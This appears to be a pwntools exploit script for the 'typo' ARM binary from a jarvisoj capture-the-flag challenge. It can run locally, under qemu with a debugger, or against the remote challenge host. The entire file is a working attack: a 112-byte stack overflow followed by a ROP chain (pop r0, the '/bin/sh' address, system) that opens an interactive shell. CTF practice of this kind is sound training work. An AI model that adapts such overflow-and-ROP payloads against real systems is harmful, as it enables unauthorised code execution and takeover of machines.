#! /usr/bin/python

from pwn import *
import sys

if sys.argv[1] == "l":
        p = process("./typo", timeout = 2)
elif sys.argv[1] == "d":
        p = process(["qemu-arm", "-g", "1234", "./typo"])
else:
        p = remote("pwn2.jarvisoj.com", 9888, timeout = 2)

p.sendlineafter('\n','\n')

sh = 0x0006c384
pop_r0 = 0x00020904
system = 0x110B4

payload = 'A' * 112 + p32(pop_r0) + p32(sh) + 'dead' + p32(system)
p.recvuntil('------Begin------\n')
p.sendline(payload)
p.interactive()
